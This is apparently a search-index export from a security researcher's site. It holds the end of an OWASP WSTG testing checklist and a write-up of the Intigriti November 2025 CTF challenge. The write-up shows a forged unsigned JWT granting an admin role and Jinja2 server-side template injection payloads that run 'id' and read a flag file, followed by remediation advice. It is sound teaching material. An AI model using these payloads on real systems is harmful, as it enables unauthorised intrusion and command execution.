Scripting</p> </li> <li> <p>Identify DOM sinks.</p> </li> <li> <p>Build payloads that pertain to every sink type.</p> </li> <li> <p> WSTG-CLNT-02 - Testing for JavaScript Execution</p> </li> <li> <p>Identify sinks and possible JavaScript injection points.</p> </li> <li> <p> WSTG-CLNT-03 - Testing for HTML Injection</p> </li> <li> <p>Identify HTML injection points and assess the severity of the injected content.</p> </li> <li> <p> WSTG-CLNT-04 - Testing for Client-side URL Redirect</p> </li> <li> <p>Identify injection points that handle URLs or paths.</p> </li> <li> <p>Assess the locations that the system could redirect to.</p> </li> <li> <p> WSTG-CLNT-05 - Testing for CSS Injection</p> </li> <li> <p>Identify CSS injection points.</p> </li> <li> <p>Assess the impact of the injection.</p> </li> <li> <p> WSTG-CLNT-06 - Testing for Client-side Resource Manipulation</p> </li> <li> <p>Identify sinks with weak input validation.</p> </li> <li> <p>Assess the impact of the resource manipulation.</p> </li> <li> <p> WSTG-CLNT-07 - Testing Cross Origin Resource Sharing</p> </li> <li> <p>Identify endpoints that implement CORS.</p> </li> <li> <p>Ensure that the CORS configuration is secure or harmless.</p> </li> <li> <p> WSTG-CLNT-08 - Testing for Cross Site Flashing</p> </li> <li> <p>Decompile and analyze the application's code.</p> </li> <li> <p>Assess sinks inputs and unsafe method usages.</p> </li> <li> <p> WSTG-CLNT-09 - Testing for Clickjacking</p> </li> <li> <p>Assess application vulnerability to clickjacking attacks.</p> </li> <li> <p> WSTG-CLNT-10 - Testing WebSockets</p> </li> <li> <p>Identify the usage of WebSockets.</p> </li> <li> <p>Assess its implementation by using the same tests on normal HTTP channels.</p> </li> <li> <p> WSTG-CLNT-11 - Testing Web Messaging</p> </li> <li> <p>Assess the security of the message's origin.</p> </li> <li> <p>Validate that it's using safe methods and validating its input.</p> </li> <li> <p> WSTG-CLNT-12 - Testing Browser Storage</p> </li> <li> <p>Determine whether the website is storing sensitive data in client-side storage.</p> </li> <li> <p>The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.</p> </li> <li> <p> WSTG-CLNT-13 - Testing for Cross Site Script Inclusion</p> </li> <li> <p>Locate sensitive data across the system.</p> </li> <li> <p>Assess the leakage of sensitive data through various techniques.</p> </li> <li> <p> WSTG-CLNT-14 - Testing for Reverse Tabnabbing</p> </li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Resources/Methodology/OWASP-WSTG/wstg/#api-testing","level":2,"title":"API Testing","text":"<ul> <li> <p> WSTG-APIT-01 - API Reconnaissance</p> </li> <li> <p>Find all API endpoints supported by the backend server code, documented or undocumented.</p> </li> <li>Find all parameters for each endpoint supported by the backend server, documented or undocumented.</li> <li> <p>Discover interesting data related to APIs in HTML and JavaScript sent to clients.</p> </li> <li> <p> WSTG-APIT-02 - API Broken Object Level Authorization</p> </li> <li> <p>The objective of this test is to identify whether the API enforces proper object-level authorization checks, ensuring that users can only access and manipulate objects they are authorized to interact with.</p> </li> <li> <p> WSTG-APIT-99 - Testing GraphQL</p> </li> <li>Assess that a secure and production-ready configuration is deployed.</li> <li>Validate all input fields against generic attacks.</li> <li>Ensure that proper access controls are applied.</li> </ul>","path":["Resources","Methodology","OWASP WSTG","OWASP Web Security Testing Guide (WSTG) Checklist"],"tags":[]},{"location":"Writeups/","level":1,"title":"Writeups","text":"<p>My collection of writeups, articles, research, etc.</p>","path":["Writeups"],"tags":[]},{"location":"Writeups/#intigriti","level":2,"title":"Intigriti","text":"<ul> <li>November 2025 Challenge</li> </ul>","path":["Writeups"],"tags":[]},{"location":"Writeups/intigriti/challenges/1125-challenge/","level":1,"title":"Intigriti November 2025 Challenge","text":"","path":["Writeups","Intigriti","Challenges","Intigriti November 2025 Challenge"],"tags":[]},{"location":"Writeups/intigriti/challenges/1125-challenge/#overview-and-rules","level":2,"title":"Overview and Rules","text":"<p>At the beginning of the November challenge, we're given a set of conditions the solution must meet, as follows:</p> <ul> <li>Should leverage a remote code execution vulnerability on the challenge page.</li> <li>Shouldn't be self-XSS or related to MiTM attacks.</li> <li>Should require no user interaction.</li> </ul> <p>So with that we can get started on the challenge.</p>","path":["Writeups","Intigriti","Challenges","Intigriti November 2025 Challenge"],"tags":[]},{"location":"Writeups/intigriti/challenges/1125-challenge/#attack-path","level":2,"title":"Attack Path","text":"<p>When navigating to the challenge page, we see an “AquaCommerce” e-commerce website.</p> <p></p> <p>We’re able to self-register an account on this site, and when doing so, we see that the site issues a JSON Web Token (JWT), as shown in the following HTTP request and response:</p> <p>Request</p> <pre><code>POST /register HTTP/1.1\nHost: challenge-1125.intigriti.io\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 38\nOrigin: &lt;https://challenge-1125.intigriti.io&gt;\nConnection: keep-alive\nReferer: &lt;https://challenge-1125.intigriti.io/register&gt;\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: green\nPriority: u=0, i\n\nusername=pawpawhacks&amp;password=password\n</code></pre> <p>Response</p> <pre><code>HTTP/1.1 302 FOUND\nDate: Thu, 20 Nov 2025 17:29:25 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 207\nConnection: keep-alive\nLocation: /dashboard\nSet-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo5LCJ1c2VybmFtZSI6InBhd3Bhd2hhY2tzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjM3NDYxNjV9.G0qH6Nb6e9nUqU4wZcRjPtxZkk4VQ-HF1FtzprkvEu8; Expires=Fri, 21 Nov 2025 17:29:25 GMT; Max-Age=86400; HttpOnly; Path=/\nVary: Cookie\nSet-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkFjY291bnQgY3JlYXRlZCBzdWNjZXNzZnVsbHkhIl19XX0.aR9P9Q.aHKc42G1DJukdUEKGZT10M4pTRo; HttpOnly; Path=/\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n\n&lt;!doctype html&gt;\n&lt;html lang=en&gt;\n&lt;title&gt;Redirecting...&lt;/title&gt;\n&lt;h1&gt;Redirecting...&lt;/h1&gt;\n&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"/dashboard\"&gt;/dashboard&lt;/a&gt;. If not, click the link.\n</code></pre> <p>Decoding this token shows that the role is declared in one of the JWT claims, as shown below:</p> <p></p> <p>If we’re able to tamper with this claim, it may be possible to grant ourselves an admin role.</p> <p>In this case, we’re able to use a “none” algorithm attack to modify the JWT in such a way that a) we’re saying there is no signing algorithm in use, and b) that we have the “admin” role.</p> <p></p> <p>Note the changes to the header and the claims sections after applying the “none” attack.</p> <p></p> <p>After modifying the JWT, I checked that the application accepted the new JWT without a signature, and found that it did. After confirming this, I set a match and replace rule in Caido so that any subsequent requests in the browser would automatically have the new JWT value applied.</p> <p></p> <p>After plugging in the modified JWT, we can now access the Admin Panel.</p> <p></p> <p>Poking around on the admin panel for a bit doesn’t reveal too much functionality that can be abused, but the “My Profile” section looks interesting.</p> <p></p> <p>The admin profile page has a functionality to update the username, which is then displayed to everyone across the entire application.</p> <p></p> <p>Since the objective of this challenge is to achieve RCE, I tried to determine if the application was vulnerable to Server-Side Template Injection. The following request shows sending a new name of <code>{{7*7}}</code>.</p> <pre><code>POST /admin/profile HTTP/1.1\nHost: challenge-1125.intigriti.io\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 142\nOrigin: &lt;https://challenge-1125.intigriti.io&gt;\nConnection: keep-alive\nReferer: &lt;https://challenge-1125.intigriti.io/admin/profile&gt;\nCookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzYzNTc2NjMwfQ.\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n\ndisplay_name={{7*7}}\n</code></pre> <p>Now we see that the name is reflected as <code>49</code>, indicating that SSTI was successful.</p> <p></p> <p>Following the flowchart on PayloadsAllTheThingsshows that the templating engine is likely Jinja2 since the payload <code>{{7*'7'}}</code> results in <code>7777777</code>.</p> <p></p> <p>By sending the following payload in the <code>displayname</code> parameter of the POST body, we are able to execute the <code>id</code> command and get the output back in the HTTP response.</p> <pre><code>{{self.__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").popen(\"id\").read()}}\n</code></pre> <p></p> <p>Now that we have remote code execution (RCE) and we can start enumerating. Running the <code>ls -la</code> command shows the contents of the current working directory.</p> <p></p> <p>The <code>.aquacommerce</code> directory looks interesting.</p> <p>Running the <code>ls -la</code> command on that directory shows an oddly named text file.</p> <p></p> <p>We’re able to read the contents of that file with the following command:</p> <pre><code>{{self.__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").popen(\"cat .aquacommerce/019a82cf.txt\").read()}}\n</code></pre> <p>And we get the flag.</p> <p></p>","path":["Writeups","Intigriti","Challenges","Intigriti November 2025 Challenge"],"tags":[]},{"location":"Writeups/intigriti/challenges/1125-challenge/#issue-description","level":2,"title":"Issue Description","text":"<p>Server-Side Template Injection occurs when user input is concatenated directly into template strings instead of being passed in as data. Attackers may be able to pass in arbitrary template directives to manipulate the template engine; in many cases this can allow the attacker to gain complete control over the underlying web server on which the vulnerable application is running.<sup>1</sup></p>","path":["Writeups","Intigriti","Challenges","Intigriti November 2025 Challenge"],"tags":[]},{"location":"Writeups/intigriti/challenges/1125-challenge/#impact","level":2,"title":"Impact","text":"<p>An attacker can execute arbitrary system commands on the underlying server in the context of the <code>appuser</code> user, and may perform any action for which the <code>appuser</code> user has permissions.</p>","path":["Writeups","Intigriti","Challenges","Intigriti November 2025 Challenge"],"tags":[]},{"location":"Writeups/intigriti/challenges/1125-challenge/#remediations","level":2,"title":"Remediations","text":"<p>Do not concatenate user input directly into template strings. Additionally, enable automatic escaping in Jinja2 by setting <code>autoescape</code> to <code>true</code> when configuring the Jinja environment.</p>","path":["Writeups","Intigriti","Challenges","Intigriti November 2025 Challenge"],"tags":[]},{"location":"Writeups/intigriti/challenges/1125-challenge/#references","level":2,"title":"References","text":"<ul> <li>PayloadsAllTheThings SSTI</li> <li>PortSwigger | Server-side Template Injection</li> </ul> <ol> <li> <p>PortSwigger Web Security Academy | Server-Side Template Injection ↩</p> </li> </ol>","path":["Writeups","Intigriti","Challenges","Intigriti November 2025 Challenge"],"tags":[]}]}